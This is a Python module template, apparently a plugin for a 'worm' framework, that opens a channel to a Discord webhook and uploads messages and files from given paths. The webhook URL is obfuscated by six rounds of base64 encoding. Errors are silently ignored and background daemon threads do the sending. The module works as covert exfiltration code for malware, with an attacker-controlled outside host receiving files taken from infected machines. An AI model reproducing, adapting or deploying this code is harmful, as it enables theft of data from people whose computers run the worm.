#!name##PyDcWeb
#!itemType##module
#!info##Allows communication via Discord Webhook and requests module. Send messages and files to Discord.
#!fileType##PY_MOD
#!lang##python
#!pyType##module
#!hiveType##PyExM
#!Var##PDW_url##_NULL##Discord webhook url.##str
#!pyModName##PyDcWebHook

{% set PY_DC_WEB_HOOK_ECOUNT = 6 %}

import base64
import requests
import threading
import os
import queue
from time import sleep
from typing import Union

class PyDcWebHook:
    MTYPES = "conn"
    STAND_TH = False
    def __init__(self, master_worm: object):
        self.worm = master_worm
        self.worm_name = self.worm.name
        self.dc_url = self._getData({{pyTOOL.encodeBase64(PDW_url, PY_DC_WEB_HOOK_ECOUNT)}})
        self.is_conn = True
        self.input_send_msg = queue.Queue()
        self.input_send_file = queue.Queue()
        self.th_send_F = None
        self.th_send_M = None
        self.pause_check = 1

    def _getData(self, text: bytes) -> str:
        for _ in range({{PY_DC_WEB_HOOK_ECOUNT}}):
            text = base64.b64decode(text)
        return text.decode()
    
    def _prepare_headers(self, text_msg: str, msg_title: str = "New data:") -> dict:
        data = {
                "content": "New Message",
                "username": self.worm_name,
                "embeds": [{
                        "title": msg_title,
                        "description": f"{text_msg}"
                        }]}
        return data
    
    def _webhook(self, headers: dict) -> None:
        try:
            resp = requests.post(self.dc_url, json=headers)
        except:
            pass
    
    def _send_msg(self, msg: str) -> None:
        head = self._prepare_headers(msg, "New Message:")
        self._webhook(head)
    
    def send_msg(self, msg: str, *args, **kwargs) -> None:
        self.input_send_msg.put(msg)
    
    def _send_file(self, fpath: str, fname: str = None, *args, **kwargs) -> None:
        if not fname:
            fname = os.path.basename(fpath)
        try:
            with open(fpath, "rb") as file:
                data = file.read()
        except:
            return
        head = {fname : data}
        try:
            requests.post(self.dc_url, files=head)
        except:
            pass
    
    def send_file(self, fpath: str, fname: str = None, *args, **kwargs) -> None:
        head = {"fpath" : fpath, "fname" : fname}
        self.input_send_file.put(head)
    
    def _check_head(self, head: Union[str, dict]) -> None:
        if isinstance(head, dict):
            fpath = head.get("fpath")
            if not fpath:
                return
            fname = head.get("fname")
            self._send_file(fpath=fpath, fname=fname)
        else:
            self._send_file(fpath=head)
    

    def _start_send_msg(self) -> None:
        while self.worm.FLAG_working:
            too_send = self.input_send_msg.get()
            sleep(self.pause_check)
            self._send_msg(too_send)
    
    def _start_send_file(self) -> None:
        while self.worm.FLAG_working:
            too_send = self.input_send_file.get()
            sleep(self.pause_check)
            self._check_head(too_send)
    
    def working(self) -> None:
        self.th_send_M = threading.Thread(target=self._start_send_msg, daemon=True)
        self.th_send_M.start()
        self.th_send_F = threading.Thread(target=self._start_send_file, daemon=True)
        self.th_send_F.start()


    def start(self) -> None:
        self.working()
        while self.worm.FLAG_working:
            sleep(self.pause_check)

        


